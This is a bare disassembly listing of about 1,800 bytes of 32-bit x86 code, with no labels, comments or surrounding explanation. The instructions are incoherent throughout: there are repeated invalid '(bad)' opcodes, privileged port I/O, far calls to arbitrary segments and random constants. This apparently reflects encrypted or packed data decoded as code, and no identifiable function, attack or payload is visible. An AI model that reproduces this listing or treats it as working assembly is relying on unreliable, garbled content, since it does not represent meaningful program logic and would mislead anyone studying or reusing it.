  4020e1:	mov    edi,0x64962f8a
  4020e6:	jmp    0x402142
  4020e8:	pop    ecx
  4020e9:	dec    edi
  4020ea:	repz inc ebp
  4020ec:	xor    ecx,DWORD PTR [edi+0x26]
  4020ef:	xchg   DWORD PTR [edi+0x4a410bbb],esi
  4020f5:	jp     0x4020fe
  4020f7:	test   BYTE PTR [ebx-0x53],0xd0
  4020fb:	leave  
  4020fc:	add    BYTE PTR [ebp+0x15],bh
  4020ff:	mov    ecx,0xccfc50b4
  402104:	mov    ecx,0xc21d138a
  402109:	xchg   ebx,eax
  40210a:	jnp    0x4020cb
  40210c:	adc    eax,0x25090a46
  402111:	xchg   BYTE PTR [ebx-0x41],bh
  402114:	mov    DWORD PTR ds:0x1534d0b,edx
  40211a:	pop    eax
  40211b:	push   edx
  40211c:	mov    bl,0x44
  40211e:	dec    ebp
  40211f:	mov    ecx,0x1c9b623e
  402124:	in     al,dx
  402125:	loopne 0x4020f0
  402127:	repnz or DWORD PTR [eax+0x1f],esi
  40212b:	dec    edx
  40212c:	adc    dh,BYTE PTR [edx+0xa602c9b]
  402132:	into   
  402133:	leave  
  402134:	sar    DWORD PTR [edx],cl
  402136:	js     0x4020f0
  402138:	div    BYTE PTR [ecx+0x62]
  40213b:	xchg   esp,eax
  40213c:	addr16 loop 0x4020d1
  40213f:	in     eax,0x2f
  402141:	inc    edx
  402142:	mov    edi,0x4b9abb63
  402147:	mov    al,0x45
  402149:	adc    DWORD PTR [ecx],ecx
  40214b:	mov    ds:0xb0736ecb,eax
  402150:	jl     0x40217e
  402152:	and    ah,dh
  402154:	retf   
  402155:	xor    DWORD PTR [eax-0x15],eax
  402158:	fdivr  QWORD PTR [ebx+0x65]
  40215b:	adc    eax,0x624a9ae8
  402160:	push   es
  402161:	mov    edx,0x66e1cab6
  402166:	out    dx,al
  402167:	xchg   eax,edi
  402169:	inc    esp
  40216a:	imul   edi,DWORD PTR [edi-0x2f995fa5],0x47
  402171:	hlt    
  402172:	mov    ah,0x85
  402174:	push   esi
  402175:	fisttp WORD PTR [ecx+eiz*8-0x77]
  402179:	test   BYTE PTR [ebp+0x32aa8267],cl
  40217f:	adc    DWORD PTR [ecx-0x375e64b6],ebp
  402185:	fisttp QWORD PTR [ebx+0x5b]
  402188:	stos   DWORD PTR es:[edi],eax
  402189:	das    
  40218a:	mov    ds:0x7bb43c5b,al
  40218f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402190:	xchg   esp,eax
  402191:	inc    esi
  402192:	push   cs
  402193:	mov    dh,0x26
  402195:	inc    edx
  402196:	dec    ebx
  402197:	outs   dx,DWORD PTR ds:[esi]
  402198:	adc    eax,DWORD PTR [esi+ecx*4+0x6e]
  40219c:	and    al,0x15
  40219e:	and    eax,0xd37c33f3
  4021a3:	and    dh,al
  4021a5:	test   eax,0x8872f130
  4021aa:	cmp    eax,0xe233d03
  4021af:	sbb    BYTE PTR [ecx],0xbf
  4021b2:	aad    0x47
  4021b4:	fcmovu st,st(0)
  4021b6:	jge    0x40219f
  4021b8:	or     BYTE PTR [edx+0x7a],cl
  4021bb:	jmp    0xff19:0x8d3d3c04
  4021c2:	xor    eax,0xba46c3a2
  4021c7:	jns    0x402162
  4021c9:	aad    0xba
  4021cb:	jae    0x402185
  4021cd:	into   
  4021ce:	rcr    eax,0x77
  4021d1:	cmp    esi,DWORD PTR [ebx+0x64]
  4021d4:	jnp    0x40218d
  4021d6:	cld    
  4021d7:	daa    
  4021d8:	js     0x40218d
  4021da:	mov    ds:0x1015560d,al
  4021df:	add    DWORD PTR [esi+0x695b691e],ecx
  4021e5:	pop    edx
  4021e6:	fmul   st(2),st
  4021e8:	push   ebp
  4021e9:	sbb    eax,0xcf0d7dcb
  4021ee:	add    eax,0x65874c24
  4021f3:	push   cs
  4021f4:	inc    esi
  4021f5:	pop    ds
  4021f6:	idiv   BYTE PTR [edi+0x515760c4]
  4021fc:	jo     0x4021ae
  4021fe:	mov    ds:0x24a8af2a,eax
  402203:	test   BYTE PTR [edi],ah
  402205:	and    DWORD PTR [ecx],esp
  402207:	and    eax,0x62c0569b
  40220c:	dec    esi
  40220e:	mov    eax,0x83e5609e
  402213:	(bad)  
  402214:	pop    esp
  402215:	mov    fs,WORD PTR fs:[ecx]
  402218:	dec    ecx
  402219:	fstp   DWORD PTR [eax-0x75]
  40221c:	scas   al,BYTE PTR es:[edi]
  40221d:	jg     0x402246
  40221f:	mov    ebx,0xedfa8132
  402224:	push   cs
  402225:	cmp    bl,ch
  402227:	aaa    
  402228:	pushf  
  402229:	repnz add BYTE PTR [edi-0x12846cca],0x1e
  402231:	push   ss
  402232:	test   BYTE PTR [esi],bl
  402234:	pusha  
  402235:	sub    DWORD PTR [ebx-0x140b84ae],esp
  40223b:	xor    bl,BYTE PTR [esi+0x4c533264]
  402241:	push   esp
  402242:	pop    edx
  402243:	sbb    al,0xbd
  402245:	out    0xee,al
  402247:	and    eax,0xee7477cc
  40224c:	push   ebx
  40224d:	mov    ah,0x33
  40224f:	test   eax,0x65eeda8c
  402254:	or     eax,0x6a710c0b
  402259:	imul   esp,esp,0xffffffd0
  40225c:	fs dec ebx
  40225e:	push   cs
  40225f:	call   0x1929:0xba46b0e0
  402266:	(bad)  
  402267:	lods   al,BYTE PTR ds:[esi]
  402268:	pop    es
  402269:	in     eax,dx
  40226a:	outs   dx,DWORD PTR fs:[esi]
  40226c:	(bad)  
  40226d:	pop    edi
  40226e:	and    al,0x81
  402270:	out    0x68,eax
  402272:	dec    ebx
  402273:	mov    cs,WORD PTR [ecx]
  402275:	mov    eax,0x58c6bcdf
  40227a:	mov    dl,0x12
  40227c:	push   ecx
  40227d:	aaa    
  40227e:	pop    eax
  40227f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402280:	mov    esp,0x6cdc663a
  402285:	test   al,0xdd
  402287:	xchg   ebx,eax
  402288:	arpl   WORD PTR [edx+0x14],bp
  40228b:	mov    bl,0xc
  40228d:	int    0xfb
  40228f:	sbb    cl,BYTE PTR [eax]
  402291:	mov    ebx,0xcf08bb71
  402296:	xor    BYTE PTR [edi+0x5653e4c8],ah
  40229c:	inc    esp
  40229d:	das    
  40229e:	es imul edx,esi,0x44d7b0ee
  4022a5:	jns    0x40224b
  4022a7:	clc    
  4022a8:	pop    eax
  4022a9:	fnstsw WORD PTR [eax*4+0x34eaaea6]
  4022b0:	(bad)  
  4022b2:	or     ecx,DWORD PTR [edi]
  4022b4:	cmp    al,0x6b
  4022b6:	pop    ds
  4022b7:	push   0x8a649a5
  4022bc:	lahf   
  4022bd:	ss dec eax
  4022bf:	dec    eax
  4022c0:	ret    0x6921
  4022c3:	jnp    0x402334
  4022c5:	nop
  4022c6:	shr    ebx,cl
  4022c8:	(bad)  
  4022c9:	mov    ch,0xa0
  4022cb:	out    dx,eax
  4022cc:	mov    bh,0xd0
  4022ce:	inc    esi
  4022cf:	shl    bh,cl
  4022d1:	imul   eax,DWORD PTR [edx+0xd],0x24
  4022d5:	lods   eax,DWORD PTR ds:[esi]
  4022d6:	cmp    al,0x4c
  4022d8:	xchg   BYTE PTR [esp+ebp*4+0x7476e2b6],al
  4022df:	add    DWORD PTR [ebx-0x785c6d48],esi
  4022e5:	lea    ebx,[edx]
  4022e7:	stos   DWORD PTR es:[edi],eax
  4022e8:	addr16 ret 0xbbae
  4022ec:	or     al,0x61
  4022ee:	cmc    
  4022ef:	xor    eax,0xd641a42e
  4022f4:	mov    dl,0x53
  4022f6:	and    ecx,DWORD PTR [edx-0x56]
  4022f9:	std    
  4022fa:	adc    al,0xa2
  4022fc:	icebp  
  4022fd:	push   edx
  4022fe:	push   ebp
  4022ff:	push   ecx
  402300:	out    dx,al
  402301:	adc    esi,ebx
  402303:	push   edi
  402304:	jo     0x402378
  402306:	leave  
  402307:	enter  0x488d,0xba
  40230b:	mov    DWORD PTR [edi+0x16765a6b],ecx
  402311:	gs push esi
  402313:	stos   BYTE PTR es:[edi],al
  402314:	aas    
  402315:	fwait
  402316:	adc    DWORD PTR [esi-0x31ad12c8],edx
  40231c:	dec    ecx
  40231d:	adc    al,al
  40231f:	lea    esi,[esi]
  402321:	mov    bl,0x58
  402323:	arpl   di,si
  402325:	(bad)  
  402326:	fsubr  QWORD PTR [ecx-0x5e548048]
  40232c:	lahf   
  40232d:	cmp    BYTE PTR [eax+0x3f357dfe],al
  402333:	scas   eax,DWORD PTR es:[edi]
  402334:	loop   0x4022d8
  402336:	pop    edi
  402337:	inc    edi
  402338:	jnp    0x40234c
  40233a:	push   ecx
  40233b:	popf   
  40233c:	adc    al,0x61
  40233e:	fdiv   DWORD PTR [esi+0x57]
  402341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402342:	mov    al,ds:0xfe6b557d
  402347:	xchg   BYTE PTR [esi+0x2f83c20b],dh
  40234d:	fimul  WORD PTR [ebx-0x2542461c]
  402353:	pop    edx
  402354:	(bad)  
  402355:	pextrw eax,(bad),0xc5
  402357:	inc    esi
  402358:	or     bh,BYTE PTR [eax+0x652e2e6f]
  40235e:	test   eax,0x234d3ed1
  402363:	icebp  
  402364:	std    
  402365:	and    ebx,DWORD PTR [esp+esi*2]
  402368:	ret    
  402369:	push   esi
  40236a:	push   esi
  40236b:	mov    ?,WORD PTR cs:[ebp+ecx*4-0x30]
  402370:	std    
  402371:	or     ecx,DWORD PTR [edx+edx*8-0x2bbec1e0]
  402378:	mov    bh,0x70
  40237a:	push   eax
  40237b:	push   ebx
  40237c:	pop    edx
  40237d:	jns    0x4023f2
  40237f:	mov    edi,0x34197969
  402384:	pop    DWORD PTR [esi-0x53a6c69f]
  40238a:	sahf   
  40238b:	push   eax
  40238c:	and    ah,BYTE PTR [ebx+0x407b32fd]
  402392:	pop    ecx
  402393:	sub    al,0xa9
  402395:	cdq    
  402396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402397:	add    BYTE PTR [ebp+0x97f8959],ah
  40239d:	pop    ebx
  40239e:	dec    edi
  40239f:	in     al,dx
  4023a0:	(bad)  
  4023a1:	aaa    
  4023a2:	and    BYTE PTR [edi-0x44c736ef],cl
  4023a8:	pop    ebx
  4023a9:	cmp    edx,DWORD PTR [ebx]
  4023ab:	test   BYTE PTR [eax],0x65
  4023ae:	sub    al,0xe8
  4023b0:	push   ecx
  4023b1:	mov    bl,0x1d
  4023b3:	aam    0xe5
  4023b5:	cmc    
  4023b6:	inc    esp
  4023b7:	push   ebp
  4023b8:	ja     0x4023aa
  4023ba:	add    eax,0xf1409b3c
  4023bf:	pop    ecx
  4023c0:	inc    ebp
  4023c1:	jbe    0x402409
  4023c3:	in     eax,0xbc
  4023c5:	xor    esi,DWORD PTR [edi-0x254a0ff2]
  4023cb:	push   ecx
  4023cc:	adc    eax,0xee754bb
  4023d1:	rcl    edx,1
  4023d3:	fmul   st,st(4)
  4023d5:	mov    gs,edi
  4023d7:	ret    
  4023d8:	adc    eax,0xe02bd2c7
  4023dd:	push   edi
  4023de:	test   BYTE PTR [ebx-0x70],al
  4023e1:	xchg   esi,eax
  4023e2:	inc    ebx
  4023e3:	xor    esp,ebx
  4023e5:	push   0xffffffff
  4023e7:	pop    ecx
  4023e8:	ret    
  4023e9:	push   0x98317242
  4023ee:	scas   eax,DWORD PTR es:[edi]
  4023ef:	pop    ecx
  4023f0:	xchg   ebx,eax
  4023f1:	jge    0x40244c
  4023f3:	popa   
  4023f4:	jne    0x402448
  4023f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f7:	xor    BYTE PTR [eax],ah
  4023f9:	loopne 0x4023be
  4023fb:	xchg   edx,eax
  4023fc:	fsub   st(5),st
  4023fe:	push   ebp
  4023ff:	pusha  
  402400:	(bad)  
  402401:	stos   BYTE PTR es:[edi],al
  402402:	(bad)  
  402403:	jns    0x4023ac
  402405:	and    ecx,ebp
  402407:	mov    al,ds:0x751f2711
  40240c:	outs   dx,BYTE PTR ds:[esi]
  40240d:	push   es
  40240e:	jle    0x4023c3
  402410:	cmp    DWORD PTR [edx+0x5b363141],ebp
  402416:	rcr    DWORD PTR [eax-0x4458fc59],1
  40241c:	sub    BYTE PTR [esi],0x45
  40241f:	mov    ecx,0xcf52cda1
  402424:	jl     0x4023fd
  402426:	shr    BYTE PTR [esp+eax*8],1
  402429:	jg     0x40240b
  40242b:	imul   ecx,DWORD PTR [edx+0x283eb073],0xffffff8f
  402432:	sbb    esi,ebp
  402434:	pop    es
  402435:	fisub  DWORD PTR [esi+0x67946512]
  40243b:	loop   0x40244b
  40243d:	mov    DWORD PTR [ecx-0x7e],ebp
  402440:	and    DWORD PTR [ecx+0x32],ecx
  402443:	add    bl,BYTE PTR [eax]
  402445:	dec    edx
  402447:	adc    ah,BYTE PTR [eax]
  402449:	lock and edx,DWORD PTR [esi-0x44]
  40244d:	call   0x299f:0xa34ce3af
  402454:	shl    DWORD PTR [eax+esi*1],1
  402457:	and    ah,dl
  402459:	daa    
  40245a:	data16 out dx,al
  40245c:	sti    
  40245d:	clc    
  40245e:	add    DWORD PTR ds:0x763fe450,0xc0183714
  402468:	push   ss
  402469:	fadd   QWORD PTR [edx-0x151562ad]
  40246f:	xor    eax,0xccd6ae83
  402474:	sbb    DWORD PTR ds:[esi+0x1e],esp
  402478:	(bad)  
  40247a:	call   0x12c4477e
  40247f:	xor    eax,0x98bfe5a1
  402484:	jecxz  0x402480
  402486:	jb     0x4024a3
  402488:	inc    ebx
  402489:	jmp    0x4024d3
  40248b:	or     eax,0xa320e3f9
  402490:	ss add al,0x54
  402493:	cld    
  402494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402495:	mov    eax,ds:0xee0d342d
  40249a:	outs   dx,DWORD PTR ds:[esi]
  40249b:	pop    ds
  40249c:	lods   al,BYTE PTR ds:[esi]
  40249d:	pop    edi
  40249e:	add    DWORD PTR ds:0x37371b8b,0x7cc0cd13
  4024a8:	pop    edx
  4024a9:	sbb    eax,0x8d5bf144
  4024ae:	out    0x1d,al
  4024b0:	and    DWORD PTR [ebp+0x34],edi
  4024b3:	sti    
  4024b4:	pop    edi
  4024b5:	retf   0x74c2
  4024b8:	lods   al,BYTE PTR ds:[esi]
  4024b9:	mov    BYTE PTR [edx],dl
  4024bb:	das    
  4024bc:	dec    eax
  4024bd:	sub    cl,BYTE PTR [eax+esi*2+0x51]
  4024c1:	out    dx,al
  4024c2:	sub    al,0xfb
  4024c4:	xor    al,0x51
  4024c6:	imul   esp,DWORD PTR [eax],0xffffffca
  4024c9:	add    BYTE PTR [esi+0x21],ah
  4024cc:	add    bh,0xb
  4024cf:	jbe    0x40250d
  4024d1:	sbb    ecx,ecx
  4024d3:	jns    0x4024e5
  4024d5:	(bad)
  4024da:	ds hlt 
  4024dc:	cmp    cl,BYTE PTR [edx+0x5fff5afa]
  4024e2:	scas   al,BYTE PTR es:[edi]
  4024e3:	jne    0x4024fb
  4024e5:	(bad)  
  4024e6:	lea    ebp,[ecx+0x34]
  4024e9:	pop    ecx
  4024ea:	xchg   ecx,eax
  4024eb:	in     eax,dx
  4024ec:	fisubr DWORD PTR [edi]
  4024ee:	call   0x621725ab
  4024f3:	mov    eax,0x8ed563f6
  4024f8:	jo     0x40247a
  4024fa:	and    al,0x72
  4024fc:	jecxz  0x402579
  4024fe:	scas   eax,DWORD PTR es:[edi]
  4024ff:	add    BYTE PTR [eax+0x29386fbb],dh
  402505:	sbb    DWORD PTR [edx-0x29],0xe8aebc5b
  40250c:	stc    
  40250d:	jns    0x4024de
  40250f:	test   BYTE PTR [edx-0x12],ah
  402512:	pushf  
  402513:	sar    DWORD PTR [ecx+0x1],1
  402516:	leave  
  402517:	rol    BYTE PTR [ecx+edx*1-0x5d1dc1af],cl
  40251e:	add    cl,BYTE PTR [ebx+eax*8]
  402521:	sbb    eax,DWORD PTR [ecx]
  402523:	xor    BYTE PTR ds:0xe0b59a5e,al
  402529:	stos   DWORD PTR es:[edi],eax
  40252a:	mov    DWORD PTR [esi],esi
  40252c:	aam    0x67
  40252e:	ja     0x402593
  402530:	or     bh,BYTE PTR [edi-0x43a927ff]
  402536:	xchg   DWORD PTR [esi-0x2646ba4],ebx
  40253c:	xor    ebp,DWORD PTR [esi-0x74]
  40253f:	adc    al,BYTE PTR [eax]
  402541:	popf   
  402542:	fdivr  DWORD PTR [esi-0x69]
  402545:	xchg   DWORD PTR [edi-0x58],edi
  402548:	and    DWORD PTR [edi-0x71ab89b2],edi
  40254e:	lahf   
  40254f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402550:	and    BYTE PTR [ecx-0x1d],dh
  402553:	xchg   esi,eax
  402554:	arpl   WORD PTR [esi+edi*4-0x6d],sp
  402558:	inc    edi
  402559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40255a:	fnsave [eax+0x4e]
  40255d:	mov    esp,0x4e89da6a
  402562:	push   eax
  402563:	jae    0x4024e6
  402565:	int3   
  402566:	dec    esi
  402567:	lahf   
  402568:	push   cs
  402569:	dec    ecx
  40256a:	sub    DWORD PTR [edi+0x2a],ecx
  40256d:	xchg   esi,eax
  40256e:	imul   BYTE PTR [eax-0x1]
  402571:	jge    0x4025db
  402573:	pop    esi
  402574:	push   ecx
  402575:	fst    st(5)
  402577:	loop   0x4025b4
  402579:	mov    ebx,0xea4239a5
  40257e:	xchg   esi,eax
  40257f:	mov    ds:0xa5ed11e1,al
  402584:	fidivr DWORD PTR [edi-0x54]
  402587:	or     al,0xc8
  402589:	cwde   
  40258a:	(bad)  
  40258b:	and    edx,DWORD PTR [edi+edx*2-0x7bfd7f79]
  402592:	fist   DWORD PTR [edi+0x43c8eb9b]
  402598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402599:	mov    al,ds:0x69eef4a6
  40259e:	bound  ebx,QWORD PTR [esi+0x6118f9b6]
  4025a4:	jb     0x40254f
  4025a6:	and    al,0xd5
  4025a8:	gs aaa 
  4025aa:	cmp    eax,0x25927e1d
  4025af:	push   ebx
  4025b0:	mov    dl,0xa2
  4025b2:	call   0x1a70:0xa2c66c93
  4025b9:	xor    edi,eax
  4025bb:	pop    esp
  4025bc:	js     0x402628
  4025be:	cdq    
  4025bf:	lock int 0x9b
  4025c2:	pop    ebp
  4025c3:	imul   ebx,DWORD PTR [ebx+edi*2+0x5311bfbc],0x758d0f72
  4025ce:	pop    ds
  4025cf:	sti    
  4025d0:	mov    edx,0x9c9f64c4
  4025d5:	cmp    eax,0xb5308513
  4025da:	cli    
  4025db:	pop    ecx
  4025dc:	data16 or al,0xec
  4025df:	ins    DWORD PTR es:[edi],dx
  4025e0:	push   esi
  4025e1:	and    cl,bl
  4025e3:	adc    bl,BYTE PTR [esi+0x2e]
  4025e6:	scas   eax,DWORD PTR es:[edi]
  4025e7:	nop
  4025e8:	retf   0xa87c
  4025eb:	lods   al,BYTE PTR ds:[esi]
  4025ec:	mov    eax,0x6b608fdd
  4025f1:	jnp    0x4025d6
  4025f3:	hlt    
  4025f4:	mov    bl,0x0
  4025f6:	and    al,0x77
  4025f8:	xchg   ebp,eax
  4025f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025fa:	scas   al,BYTE PTR es:[edi]
  4025fb:	sbb    al,0x31
  4025fd:	in     al,0x94
  4025ff:	pop    eax
  402600:	out    0x22,al
  402602:	cdq    
  402603:	mov    esp,0x74ab82fc
  402608:	cwde   
  402609:	adc    eax,0xb976b211
  40260e:	fld    DWORD PTR [ebx+0x2e]
  402611:	and    eax,0xd3fe2b7f
  402616:	sub    ah,BYTE PTR [edx-0x5d]
  402619:	push   bx
  40261b:	test   eax,0xaece7f72
  402620:	aas    
  402621:	jnp    0x402656
  402623:	pop    eax
  402624:	sbb    DWORD PTR [esi],eax
  402626:	out    0xfd,al
  402628:	cli    
  402629:	(bad)  
  40262a:	pushf  
  40262b:	cmc    
  40262c:	push   esi
  40262d:	mov    eax,0xe7cc8c5c
  402632:	in     eax,0xb9
  402634:	push   0xc9dbdd30
  402639:	and    al,0x75
  40263b:	daa    
  40263c:	aam    0x3a
  40263e:	jg     0x4026b2
  402640:	in     al,0x31
  402642:	stos   BYTE PTR es:[edi],al
  402643:	dec    ebp
  402644:	and    ch,BYTE PTR [ebx-0x4a]
  402647:	iret   
  402648:	scas   eax,DWORD PTR es:[edi]
  402649:	mov    edi,0x5f68f3f6
  40264e:	and    al,0xd0
  402650:	or     al,0x62
  402652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402653:	push   ds
  402654:	xchg   esp,eax
  402655:	ret    0x8eee
  402658:	int    0x67
  40265a:	mov    esp,0x9b08b52d
  40265f:	scas   eax,DWORD PTR es:[edi]
  402660:	call   0xaf2206e0
  402665:	mov    edx,0x519608d3
  40266a:	stc    
  40266b:	imul   esi,DWORD PTR [edx+0x15],0xffffffc4
  40266f:	lock dec esi
  402671:	push   ebx
  402672:	mov    WORD PTR [esi+ebp*1+0x759894fd],es
  402679:	icebp  
  40267a:	sbb    dh,cl
  40267c:	jl     0x402668
  40267e:	xchg   esi,eax
  40267f:	fnsave [edx-0x59]
  402682:	pop    edx
  402683:	sbb    al,0x25
  402685:	add    eax,0xd6dcbdbe
  40268a:	(bad)  
  40268c:	scas   al,BYTE PTR es:[edi]
  40268d:	out    dx,eax
  40268e:	mov    edx,0xb87b86ce
  402693:	and    eax,0xa794055d
  402698:	into   
  402699:	or     eax,0x257cd473
  40269e:	repnz leave 
  4026a0:	push   eax
  4026a1:	pop    ebx
  4026a2:	push   ss
  4026a3:	pop    ecx
  4026a4:	call   0xa00c:0x51ac7470
  4026ab:	sbb    eax,0x4ffbd274
  4026b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026b1:	push   eax
  4026b2:	jmp    0x4026d4
  4026b4:	neg    DWORD PTR [eax]
  4026b6:	dec    ebx
  4026b7:	xlat   BYTE PTR ds:[ebx]
  4026b8:	jl     0x4026fa
  4026ba:	dec    ebp
  4026bb:	push   ebx
  4026bc:	lods   al,BYTE PTR ds:[esi]
  4026bd:	inc    eax
  4026be:	jb     0x40272c
  4026c0:	scas   al,BYTE PTR es:[edi]
  4026c1:	push   edi
  4026c2:	frstor [esi+eiz*2+0x219e1d76]
  4026c9:	adc    eax,0xdba82422
  4026ce:	cmp    BYTE PTR [ebx-0x4],cl
  4026d1:	popf   
  4026d2:	fsubr  st,st(4)
  4026d4:	pop    ebp
  4026d5:	cmp    ebp,DWORD PTR [ebp+0x71]
  4026d8:	or     al,0xfe
  4026da:	retf   
  4026db:	xchg   edi,eax
  4026dc:	adc    edx,edi
  4026de:	pop    ebx
  4026df:	loopne 0x4026d1
  4026e1:	pop    ecx
  4026e2:	or     esi,DWORD PTR [ebp+0x74]
  4026e5:	inc    eax
  4026e6:	int    0x81
  4026e8:	mov    edi,0x25958c12
  4026ed:	dec    esp
  4026ee:	fwait
  4026ef:	mov    edx,0xf68d10c3
  4026f4:	push   ss
  4026f5:	dec    ebx
  4026f6:	je     0x402688
  4026f8:	pop    ss
  4026f9:	xor    eax,0x31354de9
  4026fe:	add    BYTE PTR [ecx+0x2daef60a],dl
  402704:	pop    edx
  402705:	jg     0x4026fc
  402707:	test   BYTE PTR [edi],0x75
  40270a:	dec    ebx
  40270b:	dec    ebx
  40270c:	sbb    DWORD PTR [ebx+ebp*2-0x5cf8184],0xccda38c1
  402717:	pop    edi
  402718:	jle    0x4026f2
  40271a:	adc    al,0x4f
  40271c:	rcl    al,0x21
  40271f:	adc    eax,0xd28a3fe0
  402724:	sbb    cl,BYTE PTR [ebp+0x3f]
  402727:	ret    
  402728:	retf   
  402729:	shl    BYTE PTR [ecx+0x19e09beb],0xd0
  402730:	shl    DWORD PTR [esi+0x23],0x16
  402734:	lods   al,BYTE PTR ds:[esi]
  402735:	dec    esp
  402736:	xchg   edx,eax
  402737:	loopne 0x402777
  402739:	xor    bh,BYTE PTR [ebp+0x72440ca4]
  40273f:	icebp  
  402740:	jp     0x40274d
  402742:	je     0x4027af
  402744:	fcom   DWORD PTR [ebp-0x7b]
  402747:	cmp    eax,0xb26c1c9a
  40274c:	aad    0x23
  40274e:	leave  
  40274f:	repz pop edx
  402751:	ret    
  402752:	fistp  QWORD PTR [ebx+0x74cfc79e]
  402758:	pop    ss
  402759:	inc    ecx
  40275a:	scas   eax,DWORD PTR es:[edi]
  40275b:	mov    BYTE PTR [esp+edx*4],dl
  40275e:	mov    edi,0x861e3f9e
  402763:	lea    esp,[ebx+edx*8-0x9c42db7]
  40276a:	mov    al,BYTE PTR [ecx-0x15]
  40276d:	mov    ecx,0xf1a621f8
  402772:	fadd   DWORD PTR [edi+0x13]
  402775:	dec    ecx
  402776:	mov    ecx,0x20e85b80
  40277b:	or     esi,DWORD PTR [esi-0x3d]
  40277e:	adc    al,0x59
  402780:	jmp    0x402756
  402782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402783:	es call 0xab4:0x25064a16
  40278b:	lahf   
  40278c:	jae    0x4027e3
  40278e:	sub    dh,BYTE PTR [ecx+esi*1]
  402791:	inc    ebx
  402792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402793:	aas    
  402794:	loopne 0x402811
  402796:	cmp    BYTE PTR [esi+ebp*8-0x3b],ch
  40279a:	push   edx
  40279b:	addr16 xchg edx,eax
  40279d:	(bad)  
  40279e:	adc    edi,eax
  4027a0:	sub    eax,0x9c868ef7
  4027a5:	std    
  4027a6:	dec    edx
  4027a7:	shl    BYTE PTR [ebx+0x76],0x69
  4027ab:	(bad)  
  4027ac:	loope  0x40278d
  4027ae:	pop    esp
  4027af:	inc    ebp
  4027b0:	sub    BYTE PTR [edx+0x1a],bh
  4027b3:	rcr    esp,cl
  4027b5:	enter  0xa87d,0x2b
  4027b9:	sti    
  4027ba:	cmp    esp,DWORD PTR [ebx]
  4027bc:	sahf   
  4027bd:	lods   al,BYTE PTR ds:[esi]
  4027be:	xor    BYTE PTR [edx+0xf],cl
  4027c1:	fisubr WORD PTR [esi-0x12c97d15]
  4027c7:	(bad)  
  4027c8:	xlat   BYTE PTR ds:[ebx]
  4027c9:	fnstsw WORD PTR [ebp-0x1be6bb7c]
  4027cf:	bsr    ebx,DWORD PTR [edx+0x15ab4187]
  4027d6:	ficom  DWORD PTR [ecx+0x3cb7ff68]
  4027dc:	and    DWORD PTR [eax+edx*8-0x1c10c2c8],ebx
  4027e3:	sahf   
  4027e4:	push   ss
  4027e5:	and    eax,0x9fadb97d
  4027ea:	cmp    BYTE PTR [edx+0x2a27131b],0x70
  4027f1:	stos   BYTE PTR es:[edi],al
  4027f2:	mov    eax,ds:0xd2912bf8
  4027f7:	js     0x402828
  4027f9:	inc    eax
  4027fa:	les    esi,FWORD PTR [esi+0x58b73a8d]
  402800:	fwait
  402801:	popf   
  402802:	xchg   edi,ebp
  402804:	mov    edi,0x6d9bf18f
  402809:	sub    eax,0x29288425
  40280e:	push   ebx
  40280f:	mov    esp,0xc14fc63b
  402814:	loopne 0x40280a
  402816:	daa    
  402817:	xor    eax,DWORD PTR [esi-0x24]
  40281a:	adc    BYTE PTR [esi+0x59ef7b79],dh
  402820:	aam    0x12
  402822:	js     0x402814
  402824:	mov    ds,eax
  402826:	jo     0x4027b8
  402828:	fistp  QWORD PTR [ebp-0x19832554]
  40282e:	jle    0x4027dc
  402830:	leave  
  402831:	sahf   
  402832:	aam    0x98
  402834:	lahf   
  402835:	cmp    edi,DWORD PTR [edx-0x74]
  402838:	mov    dl,0x48
  40283a:	jbe    0x40282b
  40283c:	or     DWORD PTR [edx+ecx*2+0x49],esp
  402840:	inc    ebp
  402841:	test   al,0x80
  402843:	lods   al,BYTE PTR ds:[esi]
  402844:	sar    BYTE PTR [edx+ecx*2+0x3a910713],1
  40284b:	pop    ebx
  40284c:	in     al,0xfc
  40284e:	std    
  40284f:	xchg   edi,eax
  402850:	sahf   
  402851:	dec    edi
  402852:	adc    ebp,ebx
  402854:	sbb    esi,DWORD PTR [ecx+edi*2+0x5e]
  402858:	xchg   DWORD PTR [ebp+0x62e8693d],edi
  40285e:	mov    cl,0xbf
  402860:	cdq    
  402861:	ins    WORD PTR es:[edi],dx
  402863:	fsubr  QWORD PTR [esi]
  402865:	loope  0x402819
  402867:	retf   0x7cb0
  40286a:	xchg   esi,eax
  40286b:	inc    eax
  40286c:	mov    al,0xf9
  40286e:	adc    esi,edx
  402870:	and    ebx,0xffffffd1
  402873:	in     al,dx
  402874:	dec    eax
  402875:	mov    al,0x52
  402877:	dec    esp
  402878:	iret   
  402879:	push   0xffffffbd
  40287b:	loope  0x402845
  40287d:	lock sti 
  40287f:	push   ss
  402880:	in     eax,0x27
  402882:	pop    edi
  402883:	fild   QWORD PTR [ebx+ebp*1-0x6c]
  402887:	or     eax,0xb24107b0
  40288c:	in     eax,dx
  40288d:	int3   
  40288e:	sbb    DWORD PTR ds:0x1c8aa78,0xd049eb62
  402898:	out    dx,eax
  402899:	inc    ecx
  40289a:	loope  0x40287f
  40289c:	pop    esi
  40289d:	clc    
  40289e:	jge    0x402821
  4028a0:	push   ebx
  4028a1:	bound  eax,QWORD PTR [ebx+ebx*2-0x41]
  4028a5:	jns    0x402903
  4028a7:	arpl   WORD PTR [ecx],dx
  4028a9:	xchg   esi,eax
  4028aa:	lock or edi,ebp
  4028ad:	fdivr  QWORD PTR ds:[ecx]
  4028b0:	sub    cl,BYTE PTR [eax]
  4028b2:	sti    
  4028b3:	addr16 jne 0x402934
  4028b6:	xchg   esp,eax
  4028b7:	jmp    0xa703:0xe2c49401
  4028be:	in     al,0x6e
  4028c0:	pusha  
  4028c1:	cmp    al,0xfc
  4028c3:	push   ebx
  4028c4:	push   ss
